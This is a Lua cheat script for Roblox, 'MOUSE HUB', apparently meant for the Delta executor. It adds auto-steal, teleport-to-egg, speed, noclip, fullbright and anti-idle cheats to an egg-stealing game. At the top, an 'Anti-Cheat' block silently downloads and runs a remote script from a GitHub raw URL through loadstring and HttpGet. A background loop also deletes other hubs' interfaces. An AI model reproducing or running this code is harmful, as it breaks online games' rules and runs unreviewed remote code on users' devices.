--[[
    ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗██████╗ 
    ████╗ ████║██╔═══██╗██║   ██║██╔════╝██╔════╝    ██║  ██║██║   ██║██╔══██╗
    ██╔████╔██║██║   ██║██║   ██║███████╗█████╗      ███████║██║   ██║██████╔╝
    ██║╚██╔╝██║██║   ██║██║   ██║╚════██║██╔══╝      ██╔══██║██║   ██║██╔══██╗
    ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║███████╗    ██║  ██║╚██████╔╝██████╔╝
    ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                                                                              
    Nome: MOUSE HUB
    Funções: Anti-Cheat | UI Cleaner | Auto Steal | Teleport | Speed | Noclip
    Compatível: Delta Mobile / Delta Executor
]]

-- ==================== ANTI-CHEAT (carrega script externo) ====================
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Fn-stealanegg.lua"))()
    end)
end)

-- ==================== OCULTADOR INTELIGENTE DE HUBS ====================
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualUser = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local preservarMeusScripts = {
    "mousehub", -- nome da nossa UI
}

local termosParaRemover = {
    "miranda", "foxname", "orion", "rayfield", "kavo", "fluent", 
    "windui", "venom", "loader", "uilib", "library"
}

local function devePreservar(nome)
    local n = nome:lower()
    for _, termo in ipairs(preservarMeusScripts) do
        if n:find(termo) then return true end
    end
    return false
end

local function ehHubSecundario(nome)
    local n = nome:lower()
    for _, termo in ipairs(termosParaRemover) do
        if n:find(termo) then return true end
    end
    return false
end

local function esconderOuDestruirUI(parent)
    if not parent then return end
    for _, gui in ipairs(parent:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local nomeGui = gui.Name
            if ehHubSecundario(nomeGui) and not devePreservar(nomeGui) then
                pcall(function()
                    gui.Enabled = false
                    for _, child in ipairs(gui:GetDescendants()) do
                        if child:IsA("GuiObject") then
                            child.Visible = false
                            child.Size = UDim2.new(0, 0, 0, 0)
                        end
                    end
                    gui:Destroy()
                end)
            end
        end
    end
end

task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            local pGui = LocalPlayer:FindFirstChild("PlayerGui")
            if pGui then esconderOuDestruirUI(pGui) end
            
            local hui = (gethui and gethui()) or game:GetService("CoreGui")
            if hui then esconderOuDestruirUI(hui) end
        end)
    end
end)

-- ==================== MOUSE HUB - SCRIPT PRINCIPAL ====================
print("[MOUSE HUB] Iniciando...")

local MOUSE = {
    AutoSteal = false,
    SpeedEnabled = false,
    NoclipEnabled = false,
    FullBright = false,
    SpeedValue = 60,
    AutoStealDelay = 0.3,
    EggKeyword = "Egg",
    OriginalWalkSpeed = 16,
}

local function getCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

local function getHRP()
    local char = getCharacter()
    return char:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid()
    local char = getCharacter()
    return char:FindFirstChildOfClass("Humanoid")
end

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MouseHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = (gethui and gethui()) or LocalPlayer:WaitForChild("PlayerGui")

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 70, 0, 70)
ToggleBtn.Position = UDim2.new(0, 20, 0.5, -35)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ToggleBtn.TextColor3 = Color3.fromRGB(0, 220, 255)
ToggleBtn.Text = "MOUSE\nHUB"
ToggleBtn.TextSize = 13
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.BorderSizePixel = 0
ToggleBtn.Parent = ScreenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = ToggleBtn

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 220, 255)
stroke.Thickness = 2
stroke.Parent = ToggleBtn

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 420)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 16)
mainCorner.Parent = MainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(0, 220, 255)
mainStroke.Thickness = 1.5
mainStroke.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 55)
Title.BackgroundTransparency = 1
Title.Text = "🐭 MOUSE HUB"
Title.TextColor3 = Color3.fromRGB(0, 220, 255)
Title.TextSize = 24
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

local Subtitle = Instance.new("TextLabel")
Subtitle.Size = UDim2.new(1, 0, 0, 20)
Subtitle.Position = UDim2.new(0, 0, 0, 50)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Auto Steal • Teleport • Speed"
Subtitle.TextColor3 = Color3.fromRGB(150, 150, 170)
Subtitle.TextSize = 12
Subtitle.Font = Enum.Font.Gotham
Subtitle.Parent = MainFrame

local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(1, -20, 1, -90)
Scroll.Position = UDim2.new(0, 10, 0, 80)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.ScrollBarThickness = 4
Scroll.ScrollBarImageColor3 = Color3.fromRGB(0, 220, 255)
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
Scroll.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 8)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Parent = Scroll

local function criarBotao(nome, cor, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 48)
    btn.BackgroundColor3 = cor or Color3.fromRGB(40, 40, 55)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Text = nome
    btn.TextSize = 15
    btn.Font = Enum.Font.GothamMedium
    btn.BorderSizePixel = 0
    btn.Parent = Scroll
    
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 8)
    c.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        callback(btn)
    end)
    
    return btn
end

-- Funções
local function toggleSpeed(btn)
    MOUSE.SpeedEnabled = not MOUSE.SpeedEnabled
    local hum = getHumanoid()
    if hum then
        hum.WalkSpeed = MOUSE.SpeedEnabled and MOUSE.SpeedValue or MOUSE.OriginalWalkSpeed
    end
    btn.Text = "🏃 Speed: " .. (MOUSE.SpeedEnabled and "ON" or "OFF")
    btn.BackgroundColor3 = MOUSE.SpeedEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
end

local function toggleNoclip(btn)
    MOUSE.NoclipEnabled = not MOUSE.NoclipEnabled
    btn.Text = "👻 Noclip: " .. (MOUSE.NoclipEnabled and "ON" or "OFF")
    btn.BackgroundColor3 = MOUSE.NoclipEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
end

local function toggleFullBright(btn)
    MOUSE.FullBright = not MOUSE.FullBright
    if MOUSE.FullBright then
        Lighting.Brightness = 3
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
        Lighting.OutdoorAmbient = Color3.fromRGB(180, 180, 180)
    else
        Lighting.Brightness = 1
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
    end
    btn.Text = "💡 Full Bright: " .. (MOUSE.FullBright and "ON" or "OFF")
    btn.BackgroundColor3 = MOUSE.FullBright and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
end

local function encontrarOvo()
    local ovoMaisProximo = nil
    local distanciaMinima = math.huge
    local hrp = getHRP()
    
    if not hrp then return nil end
    
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and string.find(string.lower(obj.Name), string.lower(MOUSE.EggKeyword)) then
            local distancia = (obj.Position - hrp.Position).Magnitude
            if distancia < distanciaMinima then
                distanciaMinima = distancia
                ovoMaisProximo = obj
            end
        end
    end
    
    return ovoMaisProximo
end

local function teleportParaOvo(btn)
    local ovo = encontrarOvo()
    local hrp = getHRP()
    
    if ovo and hrp then
        hrp.CFrame = CFrame.new(ovo.Position + Vector3.new(0, 3, 0))
        btn.Text = "✅ Teleportado!"
        task.wait(1)
        btn.Text = "🎯 Ir até o Ovo"
    else
        btn.Text = "❌ Ovo não encontrado"
        task.wait(1.5)
        btn.Text = "🎯 Ir até o Ovo"
    end
end

local function toggleAutoSteal(btn)
    MOUSE.AutoSteal = not MOUSE.AutoSteal
    btn.Text = "🥚 Auto Steal: " .. (MOUSE.AutoSteal and "ON" or "OFF")
    btn.BackgroundColor3 = MOUSE.AutoSteal and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
end

task.spawn(function()
    while task.wait(MOUSE.AutoStealDelay) do
        if MOUSE.AutoSteal then
            local ovo = encontrarOvo()
            local hrp = getHRP()
            if ovo and hrp then
                hrp.CFrame = CFrame.new(ovo.Position + Vector3.new(0, 3, 0))
            end
        end
    end
end)

RunService.Stepped:Connect(function()
    if MOUSE.NoclipEnabled then
        local char = getCharacter()
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end
end)

LocalPlayer.Idled:Connect(function()
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)

-- Botões
criarBotao("🥚 Auto Steal: OFF", Color3.fromRGB(40, 40, 55), toggleAutoSteal)
criarBotao("🎯 Ir até o Ovo", Color3.fromRGB(40, 40, 55), teleportParaOvo)
criarBotao("🏃 Speed: OFF", Color3.fromRGB(40, 40, 55), toggleSpeed)
criarBotao("👻 Noclip: OFF", Color3.fromRGB(40, 40, 55), toggleNoclip)
criarBotao("💡 Full Bright: OFF", Color3.fromRGB(40, 40, 55), toggleFullBright)
criarBotao("❌ Fechar Menu", Color3.fromRGB(120, 40, 40), function()
    MainFrame.Visible = false
end)

ToggleBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Drag
local dragging, dragStart, startPos

ToggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or 
       input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = ToggleBtn.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.Touch or 
                     input.UserInputType == Enum.UserInputType.MouseMovement) then
        local delta = input.Position - dragStart
        ToggleBtn.Position = UDim2.new(
            startPos.X.Scale, 
            startPos.X.Offset + delta.X, 
            startPos.Y.Scale, 
            startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or 
       input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    if MOUSE.SpeedEnabled then
        local hum = getHumanoid()
        if hum then
            hum.WalkSpeed = MOUSE.SpeedValue
        end
    end
end)

print("╔═══════════════════════════════════╗")
print("║   🐭 MOUSE HUB CARREGADO          ║")
print("║   Anti-Cheat: ON                  ║")
print("║   Toque em MOUSE HUB pra abrir    ║")
print("╚═══════════════════════════════════╝")
